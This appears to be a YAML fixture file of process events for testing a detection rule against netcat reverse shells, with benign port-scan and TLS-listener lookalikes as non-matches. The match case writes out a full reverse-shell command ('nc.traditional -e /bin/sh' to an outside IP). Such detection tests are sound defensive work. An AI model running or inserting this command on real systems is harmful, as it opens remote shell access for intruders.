# Hand-written fixtures (the converter does not generate them); values are invented.
match:
  - desc: "netcat runs a shell for a remote host"
    events:
      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24101, "ppid": 24090, "exe": "/usr/bin/nc.traditional", "name": "nc.traditional", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "nc.traditional -e /bin/sh 198.51.100.20 4444", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
nomatch:
  - desc: "benign lookalike - netcat port scan"
    events:
      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24110, "ppid": 24090, "exe": "/usr/bin/nc", "name": "nc", "uid": -1, "euid": -1, "username": "root", "cmdline": "nc -zv db.internal 5432", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
  - desc: "ncat TLS listener"
    events:
      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24111, "ppid": 24090, "exe": "/usr/bin/ncat", "name": "ncat", "uid": -1, "euid": -1, "username": "root", "cmdline": "ncat --ssl -l 8443", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
